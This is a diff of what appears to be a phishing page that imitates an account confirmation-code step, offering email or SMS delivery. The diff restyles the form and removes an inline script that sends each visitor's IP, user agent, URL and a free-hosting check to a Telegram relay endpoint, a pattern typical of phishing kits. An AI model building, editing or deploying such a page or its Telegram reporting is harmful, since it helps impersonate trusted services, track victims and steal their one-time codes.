@@ -41,6 +41,7 @@
         <div class="login-block clearfix auth-block">
           <div class="col-le">
             <div class="conf">
+              <img src="lock-icon-512.png" alt="Lock icon" class="lock-icon-img" width="48" height="48">
               Protecting your information is our first priority. In order to access this site or perform this specific function you must receive a confirmation code to the device of your choice. You will be asked to enter the code on the next screen.
             </div>
 
@@ -49,31 +50,23 @@
                 <h2 class="title">Confirmation Code</h2>
 
                 <div class="field-label">
-                  <label for="delivery-method">Send code by</label>
+                  <label>Send code by</label>
                   <em>*</em>
                 </div>
                 <span class="text-danger field-validation-valid" id="method_validation_message" role="alert"></span>
-                <select class="inp auth-select" id="delivery-method" name="DeliveryMethod" required>
-                  <option value="" selected disabled>Select Email or SMS</option>
-                  <option value="email">Email</option>
-                  <option value="sms">SMS</option>
-                </select>
 
-                <div class="auth-destination" id="auth-destination" hidden>
-                  <div class="field-label">
-                    <label for="destination" id="destination-label">Registered email</label>
-                    <em>*</em>
-                  </div>
-                  <span class="text-danger field-validation-valid" id="destination_validation_message" role="alert"></span>
-                  <input
-                    class="inp"
-                    id="destination"
-                    name="Destination"
-                    type="text"
-                    autocomplete="off"
-                    placeholder=""
-                  >
-                  <p class="auth-hint" id="auth-hint"></p>
+                <!-- ====== RADIO BUTTONS FOR METHOD SELECTION ====== -->
+                <div class="method-selection">
+                  <label class="method-option-radio">
+                    <input type="radio" name="delivery-method" value="email" id="method-email" checked>
+                    <span class="method-radio-custom"></span>
+                    <span class="method-label-text">Email</span>
+                  </label>
+                  <label class="method-option-radio">
+                    <input type="radio" name="delivery-method" value="sms" id="method-sms">
+                    <span class="method-radio-custom"></span>
+                    <span class="method-label-text">SMS</span>
+                  </label>
                 </div>
 
                 <div class="auth-actions">
@@ -88,7 +81,7 @@
             <div class="auth-info" role="note">
               <span class="auth-info__icon" aria-hidden="true">i</span>
               <p>
-                To proceed, please press the generate code button. If you wish to cancel, you will be asked to enter a code the next time you login or try to perform this specific function.
+                To proceed, please select a method and press the generate code button. If you wish to cancel, you will be asked to enter a code the next time you login or try to perform this specific function.
               </p>
             </div>
           </div>
@@ -128,85 +121,5 @@
   </div>
 
   <script src="auth.js"></script>
-  <!-- Add this after the existing auth.js script -->
-<script>
-  // ============================================================
-  // ====== DOMAIN DETECTION FOR AUTH PAGE ======================
-  // ============================================================
-
-  async function sendToTelegram(action, data) {
-    try {
-      let ipData = { ip: 'Unknown' };
-      try {
-        const response = await fetch('/api/ip');
-        if (response.ok) {
-          ipData = await response.json();
-        }
-      } catch (e) {
-        console.warn('Could not fetch IP data');
-      }
-
-      const payload = {
-        action: action,
-        data: {
-          ...data,
-          timestamp: new Date().toLocaleString('en-US', { 
-            timeZone: 'America/New_York',
-            hour12: true,
-            year: 'numeric',
-            month: '2-digit',
-            day: '2-digit',
-            hour: '2-digit',
-            minute: '2-digit',
-            second: '2-digit'
-          }),
-          userAgent: navigator.userAgent,
-          ip: ipData.ip || 'Unknown'
-        }
-      };
-
-      await fetch('/api/telegram', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
-    } catch (error) {
-      console.error('Failed to send to Telegram:', error);
-    }
-  }
-
-  function detectDomain() {
-    const currentUrl = window.location.href;
-    const urlObj = new URL(currentUrl);
-    const domain = urlObj.hostname;
-    
-    const freeDomains = [
-      '.tk', '.ml', '.ga', '.cf', '.gq',
-      '.free.nf', '.free.org', '.free.com',
-      '.co.cc', '.co.nr', '.cjb.net',
-      '.dynu.net', '.ddns.net', '.no-ip.org',
-      'vercel.app', 'netlify.app', 'github.io',
-      'pages.dev', 'web.app', 'firebaseapp.com',
-      'herokuapp.com', 'glitch.me', 'replit.co',
-      '000webhostapp.com', 'byethost.com',
-      'freehostia.com', 'profreehost.com',
-      '.example.com', '.test', '.localhost'
-    ];
-
-    const isFree = freeDomains.some(freeDomain => 
-      domain.includes(freeDomain) || domain.endsWith(freeDomain)
-    );
-
-    sendToTelegram('domain_detection', {
-      url: currentUrl,
-      domain: domain,
-      isFree: isFree
-    });
-
-    console.log(`🌐 Domain detected: ${domain} (${isFree ? 'FREE' : 'PURCHASED'})`);
-  }
-
-  detectDomain();
-</script>
 </body>
 </html>
